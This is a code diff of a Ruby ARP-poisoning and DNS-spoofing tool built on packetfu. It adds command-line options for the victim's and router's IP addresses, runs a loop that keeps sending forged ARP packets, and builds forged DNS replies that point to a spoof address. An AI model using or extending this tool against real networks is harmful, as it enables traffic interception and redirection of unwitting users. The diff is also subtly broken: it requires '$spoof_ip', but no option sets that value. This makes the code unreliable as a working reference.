@@ -3,15 +3,30 @@ require 'rubygems'
 require 'packetfu'
 require 'thread'
 require 'macaddr'
+require 'utils.rb'
 
-### User Defined ###############################
+#parse command line arguments
+OptionParser.new do |opts|
+  opts.on("-h", "--help", "usage and program help") do
+    usage()
+    exit(1)
+  end
+  opts.on("-v n", "--victim", "victim's IP address") do |vctm|
+    $target_ip = vctm
+  end
+  opts.on("-r n", "--router", "router IP address") do |router|
+    $router_ip = router
+  end
+  opts.on("-i n", "--interface", "network interface") do |interface|
+    $iface = interface
+  end
+end.parse!
 
-target_ip = '192.168.0.9'
-router_ip = '192.168.0.100'
-$attacker_ip = '192.168.0.8'
-iface = 'em1'
+#did they supply a victim and an address to spoof to?
+if $target_ip.nil? || $spoof_ip.nil?
+  abort("You must specify the victim's IP address and an IP address to spoof!")
+end
 
-################################################
 
 # Get the mac addresses for all the necessary machines.
 sender_mac = Mac.addr
@@ -51,8 +66,8 @@ def runspoof(arp_packet_target,arp_packet_router)
   caught=false
   while caught==false do
     sleep 1
-    arp_packet_target.to_w(@interface)
-    arp_packet_router.to_w(@interface)
+    arp_packet_target.to_w($iface)
+    arp_packet_router.to_w($iface)
   end
 end
 
@@ -60,7 +75,7 @@ end
 def sendResponse(packet, domainName)
 
   # Convert the IP address
-  myIP = $attacker_ip.split(".");
+  myIP = $spoof_ip.split(".");
   myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')
 
   # Create the UDP packet
